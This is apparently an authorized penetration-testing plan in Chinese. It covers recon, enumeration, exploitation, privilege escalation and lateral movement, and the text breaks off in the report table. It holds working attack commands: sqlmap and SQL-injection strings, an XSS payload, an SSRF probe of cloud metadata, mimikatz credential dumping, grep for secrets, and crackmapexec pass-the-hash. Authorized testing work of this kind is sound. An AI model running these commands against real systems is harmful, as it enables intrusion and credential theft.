## 渗透测试方案 · TARGET 授权测试

> 选型：单目标 Web + 内网横向 · 5 阶段 · 每阶段含命令、预期回显、证据落盘路径

---

### 0. 目标与约束

| 项 | 内容 |
| --- | --- |
| 测试对象 | `TARGET`（域名 / IP 段 `CIDR`） |
| 授权依据 | 委托方书面授权书编号 `AUTH_ID`，有效期 `START_DATE` ~ `END_DATE` |
| 测试窗口 | `WINDOW`（避开业务高峰，默认 22:00–06:00） |
| 范围边界 | 授权清单内资产；`OUT_OF_SCOPE` 明确排除 |
| 禁止动作 | 破坏性 DoS、真实数据外传、生产库写操作、社工委托方员工 |
| 证据目录 | `RESULT_DIR=/pentest/TARGET_$(date +%Y%m%d)` |
| 回滚预案 | 每阶段前快照 / 变更前备份；异常即停并通知 `CONTACT` |

---

### 1. 侦察（Recon）

**1.1 子域枚举**

```bash
mkdir -p $RESULT_DIR/{recon,enum,exploit,evidence}
subfinder -d TARGET -all -silent | tee $RESULT_DIR/recon/subs.txt
amass enum -passive -d TARGET -o $RESULT_DIR/recon/amass.txt
```

**1.2 存活与指纹**

```bash
httpx -l $RESULT_DIR/recon/subs.txt -title -tech-detect -status-code \
  -o $RESULT_DIR/recon/alive.txt
nmap -sV -sC -Pn -iL $RESULT_DIR/recon/alive.txt -oA $RESULT_DIR/recon/nmap
```

**1.3 URL 收集**

```bash
cat $RESULT_DIR/recon/alive.txt | gau | tee $RESULT_DIR/recon/urls.txt
katana -list $RESULT_DIR/recon/alive.txt -d 3 -o $RESULT_DIR/recon/katana.txt
```

预期回显：`alive.txt` 每行 `URL [状态码] [标题] [技术栈]`；`nmap` 输出 `PORT/STATE/SERVICE/VERSION`。

---

### 2. 枚举（Enumeration）

**2.1 目录与接口爆破**

```bash
ffuf -u https://TARGET/FUZZ -w WORDLIST -t 40 -mc 200,301,302,401,403 \
  -o $RESULT_DIR/enum/ffuf.json
```

**2.2 JS 接口提取**

```bash
cat $RESULT_DIR/recon/katana.txt | grep '\.js$' | sort -u > $RESULT_DIR/enum/js.txt
while read u; do
  curl -sk "$u" | grep -oE '"/[a-zA-Z0-9_/-]+"' 
done < $RESULT_DIR/enum/js.txt | sort -u > $RESULT_DIR/enum/api_paths.txt
```

**2.3 参数发现**

```bash
arjun -u https://TARGET/ENDPOINT -oJ $RESULT_DIR/enum/arjun.json
```

预期回显：`ffuf` 输出 `FUZZ → 状态码 / 长度 / 重定向`；`api_paths.txt` 每行一个接口路径。

---

### 3. 漏洞验证（Exploitation）

按攻击面分类，逐类验证，**每类只做最小可证伪载荷**。

**3.1 注入类**

```bash
sqlmap -u "https://TARGET/ENDPOINT?id=1" --batch --level=3 --risk=2 \
  --output-dir=$RESULT_DIR/exploit/sqlmap
```

**3.2 XSS**

```bash
# 反射型：载荷 PAYLOAD=<script>alert(document.domain)</script>
curl -sk "https://TARGET/ENDPOINT?q=PAYLOAD" | grep -F 'PAYLOAD'
# 盲打外带：OAST_DOMAIN
```

**3.3 SSRF**

```bash
# 内网探测载荷
curl -sk "https://TARGET/ENDPOINT?url=http://169.254.169.254/latest/meta-data/"
```

**3.4 文件上传 / 越权**

```bash
# 上传点：先传无害文件验证类型校验
curl -sk -F "file=@test.txt" https://TARGET/UPLOAD_ENDPOINT
# 越权：ROLE_A 令牌访问 ROLE_B 资源
curl -sk -H "Cookie: COOKIE_A" https://TARGET/admin/RESOURCE_ID
```

**3.5 WAF 绕过（命中拦截时）**

```bash
# 编码 / 分块 / 大小写混淆 / 参数污染，模板按指纹选取
curl -sk "https://TARGET/ENDPOINT?id=1%27%20OR%201=1--"
```

预期回显：命中即落 `$RESULT_DIR/exploit/<类别>_<时间戳>.txt`，含请求原文 + 响应片段 + 判定依据。

---

### 4. 权限提升与横向（Post-Exploitation）

**4.1 本机信息收集**

```bash
# Linux
id; uname -a; sudo -l; find / -perm -4000 -type f 2>/dev/null
# Windows
whoami /all; systeminfo; net user; net localgroup administrators
```

**4.2 凭据获取**

```bash
# 内存凭据（授权范围内）
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
# 配置文件凭据
grep -rEi 'password|passwd|secret|token' /var/www /etc 2>/dev/null
```

**4.3 横向移动**

```bash
# 凭据复用
crackmapexec smb CIDR -u USER -p PASS -d DOMAIN
# 票据 / 哈希传递
crackmapexec smb CIDR -u USER -H NTLM_HASH
```

**4.4 权限维持（测试后清理）**

```bash
# 仅记录可行性，测试结束立即移除
# 计划任务 / 服务 / SSH key —— 记录路径与清理命令
```

预期回显：`crackmapexec` 输出 `[+] DOMAIN\USER:HASH (Pwn3d!)`；凭据落 `$RESULT_DIR/exploit/creds.txt`（加密存储）。

---

### 5. 证据整理与报告

**5.1 证据表结构**

| 编号 | 漏洞 | 位置 | 请求/载荷 | 回显摘要 | 证据文件 | 哈希 |
| --- | --- | --- | --- | --- | --- | --- |
| V-01 | SQL 注入 | `/ENDPOINT?id=` | `1' OR 1=1--` | `…` | `exploit